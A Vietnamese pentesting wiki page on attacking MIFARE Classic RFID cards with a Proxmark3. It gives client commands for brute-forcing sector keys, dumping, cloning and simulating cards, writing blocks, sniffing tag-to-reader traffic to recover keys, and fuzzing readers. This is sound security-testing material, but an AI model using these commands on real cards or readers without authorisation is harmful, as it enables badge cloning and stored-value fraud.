# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Tấn công hệ thống RFID bằng Proxmark3

Cài đặt client Proxmark3 RRG/Iceman đang được duy trì tích cực cùng firmware tương ứng, sau đó xác nhận cú pháp lệnh của bản dựng đó vì các lệnh cũ bên dưới có thể đã thay đổi.<sup>[[1]](#references)[[5]](#references)</sup>

### Tấn công MIFARE Classic 1KB

MIFARE Classic 1K có **16 sector**, mỗi sector gồm **4 block** chứa **16 byte**. Block 0 của nhà sản xuất chứa UID/dữ liệu nhà sản xuất và chỉ đọc trên thẻ NXP chính hãng; một số thẻ clone hoặc thẻ “magic” có thể cho phép ghi đè dữ liệu này.<sup>[[1]](#references)[[2]](#references)</sup>\
Để truy cập từng sector, bạn cần **2 key** (**A** và **B**), được lưu trong **block 3 của mỗi sector** (sector trailer). Sector trailer cũng lưu **access bit**, quy định quyền **đọc và ghi** trên **từng block** bằng 2 key này.\
Ví dụ, 2 key có thể được dùng để cấp quyền đọc nếu bạn biết key thứ nhất và quyền ghi nếu bạn biết key thứ hai.

Có thể thực hiện một số cuộc tấn công.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 cho phép thực hiện các hành động khác như **eavesdropping** một **giao tiếp Tag-to-Reader** để tìm dữ liệu nhạy cảm. Với loại thẻ này, bạn chỉ cần sniff giao tiếp và tính toán key được sử dụng, vì **các thao tác mã hóa được dùng rất yếu**; khi biết bản rõ và bản mã, bạn có thể tính ra key (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### Quy trình nhanh MiFare Classic để lạm dụng giá trị lưu trữ

Để xem quy trình key-recovery, balance-diffing, integrity-field và UID-cloning—bao gồm transcript của Proxmark3 client và các hạn chế của magic-card—xem [MiFare Classic offline stored-value tampering](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1).

### Raw Commands

Các hệ thống IoT đôi khi sử dụng **tag không có thương hiệu hoặc không mang tính thương mại**. Trong trường hợp này, bạn có thể dùng Proxmark3 để gửi **raw commands tùy chỉnh đến tag**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Với thông tin này, bạn có thể thử tìm hiểu về thẻ và cách giao tiếp với thẻ. Proxmark3 cho phép gửi các lệnh thô như: `hf 14a raw -p -b 7 26`

### Scripts

Phần mềm Proxmark3 đi kèm danh sách **automation scripts** được tải sẵn, cho phép bạn thực hiện các tác vụ đơn giản. Để xem toàn bộ danh sách, hãy dùng lệnh `script list`. Tiếp theo, dùng lệnh `script run`, theo sau là tên script:

```
proxmark3> script run mfkeys
```

Bạn có thể tạo một script để **fuzz đầu đọc thẻ**: chỉ cần sao chép dữ liệu từ một **thẻ hợp lệ**, viết một **Lua script** để **ngẫu nhiên hóa** một hoặc nhiều **byte** ngẫu nhiên rồi kiểm tra xem **đầu đọc có bị crash** ở bất kỳ lần lặp nào không.

## References

- [1] [Wiki Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki Proxmark3: thẻ HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Tuyên bố của NXP về Crypto1 của MIFARE Classic](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Khai thác lỗ hổng thẻ NFC trong KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — cài đặt trên Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
